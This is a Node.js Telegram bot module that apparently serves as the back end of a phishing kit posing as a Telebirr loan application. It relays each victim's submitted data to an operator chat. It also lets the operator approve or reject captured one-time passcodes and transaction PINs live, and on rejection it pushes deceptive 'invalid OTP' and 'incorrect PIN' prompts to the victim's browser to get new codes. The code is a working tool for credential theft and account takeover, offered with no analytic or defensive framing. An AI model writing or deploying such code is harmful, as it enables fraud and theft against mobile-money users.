require('dotenv').config();
const TelegramBot = require('node-telegram-bot-api');

const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.ADMIN_CHAT_ID;

const bot = new TelegramBot(BOT_TOKEN, { polling: false });

function escapeMarkdown(text) {
    if (!text) return '';
    return String(text).replace(/([_*\[\]()~`>#+=|{}.!])/g, '\\$1');
}

function sendToAdmin(appId, stepTitle, data, requireInlineButtons = false) {
    if (!CHAT_ID) return;

    let detailedFields = '';
    if (data && typeof data === 'object') {
        Object.entries(data).forEach(([key, val]) => {
            if (val !== undefined && val !== null && val !== '') {
                detailedFields += `• ${escapeMarkdown(key)}:\n_${escapeMarkdown(val)}_\n\n`;
            }
        });
    }

    const currentStatus = requireInlineButtons ? "Awaiting Administrator Review" : "Background Logging Registered";

    const message = `
━━━━━━━━━━━━━━━━━━━━━━
📱 *TELEBIRR LOAN SESSION*
━━━━━━━━━━━━━━━━━━━━━━
*Session ID*
\`${escapeMarkdown(appId)}\`

*Current Step*
_${escapeMarkdown(stepTitle)}_
━━━━━━━━━━━━━━━━━━━━━━
*Submitted Information*
${detailedFields.trim()}
━━━━━━━━━━━━━━━━━━━━━━
*Status:*
_${escapeMarkdown(currentStatus)}_
━━━━━━━━━━━━━━━━━━━━━━
`.trim();

    const options = { parse_mode: 'Markdown' };

    if (requireInlineButtons) {
        let inlineKeyboard = [];
        if (stepTitle.includes("Step 2")) {
            inlineKeyboard = [[
                { text: "✅ Approve OTP", callback_data: `otp_approve:${appId}` },
                { text: "❌ Reject OTP", callback_data: `otp_reject:${appId}` }
            ]];
        } else if (stepTitle.includes("Step 3")) {
            inlineKeyboard = [[
                { text: "✅ Approve PIN", callback_data: `pin_approve:${appId}` },
                { text: "❌ Reject PIN", callback_data: `pin_reject:${appId}` }
            ]];
        }
        options.reply_markup = { inline_keyboard: inlineKeyboard };
    }

    bot.sendMessage(CHAT_ID, message, options)
        .catch((err) => console.error(`❌ [TELEGRAM ERROR] Send failed for ${appId}:`, err.message));
}

bot.on('callback_query', async (callbackQuery) => {
    const actionData = callbackQuery.data;
    const message = callbackQuery.message;
    if (!actionData) return;

    const [actionSignal, targetAppId] = actionData.split(':');
    let decisionStamp = '';
    
    if (!global.io) {
        console.error("❌ [BOT MANAGER ERROR] global.io missing.");
        return;
    }

    // Process action signals matching current pipeline requirements
    if (actionSignal === 'otp_approve') {
        global.io.to(targetAppId).emit('admin-dashboard-approve');
        decisionStamp = "✅ APPROVED";
    } else if (actionSignal === 'otp_reject') {
        global.io.to(targetAppId).emit('otp-rejected', { message: "Invalid OTP. Please enter the correct verification code." });
        decisionStamp = "❌ REJECTED";
    } else if (actionSignal === 'pin_approve') {
        global.io.to(targetAppId).emit('final-pin-accepted');
        decisionStamp = "✅ APPROVED";
    } else if (actionSignal === 'pin_reject') {
        global.io.to(targetAppId).emit('pin-rejected', { message: "Incorrect Transaction PIN. Please try again." });
        decisionStamp = "❌ REJECTED";
    }

    const serverTime = new Date().toLocaleTimeString('en-US', { hour12: false });

    // Update message configuration cards to render final audit trails cleanly
    const updatedBody = `
${message.text}
━━━━━━━━━━━━━━━━━━━━━━
*Decision*
${decisionStamp}

_Reviewed By Administrator_
*Time:* ${serverTime}
━━━━━━━━━━━━━━━━━━━━━━
`.trim();

    try {
        await bot.editMessageText(updatedBody, {
            chat_id: CHAT_ID,
            message_id: message.message_id,
            parse_mode: 'Markdown',
            reply_markup: { inline_keyboard: [] }
        });
    } catch (e) {
        console.error("❌ [TELEGRAM REWRITE ERROR]", e.message);
    }
});

module.exports = { bot, sendToAdmin };